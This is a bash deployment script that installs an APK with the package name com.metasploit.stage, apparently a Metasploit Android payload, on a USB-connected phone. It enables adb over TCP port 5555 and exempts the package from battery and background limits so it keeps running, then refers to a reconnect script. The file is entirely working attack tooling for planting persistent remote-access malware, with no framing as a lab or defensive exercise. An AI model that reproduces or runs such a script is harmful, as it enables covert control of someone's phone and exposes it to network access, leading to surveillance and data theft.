#!/bin/bash
# Install test.apk on a connected USB device and fully whitelist it.
# Run once per device. USB debugging must be enabled on the phone.

set -e

APK="$(dirname "$0")/test.apk"

echo "[*] Checking device..."
adb devices | grep -v "List of" | grep "device" || { echo "[-] No device found. Check USB + USB debugging."; exit 1; }

echo "[*] Uninstalling old version (ignore 'not installed')..."
adb uninstall com.metasploit.stage 2>/dev/null; true

echo "[*] Installing $APK..."
adb install "$APK"

echo "[*] Enabling TCP mode on port 5555..."
adb tcpip 5555

echo "[*] Whitelisting from battery restrictions..."
adb shell cmd deviceidle whitelist +com.metasploit.stage
adb shell cmd appops set com.metasploit.stage RUN_IN_BACKGROUND allow
adb shell cmd appops set com.metasploit.stage RUN_ANY_IN_BACKGROUND allow
adb shell am set-inactive com.metasploit.stage false

echo ""
echo "[+] Done. You can unplug USB now."
echo "    To connect: ./reconnect.sh"
echo "    Then open the MetaSploit app on the phone."
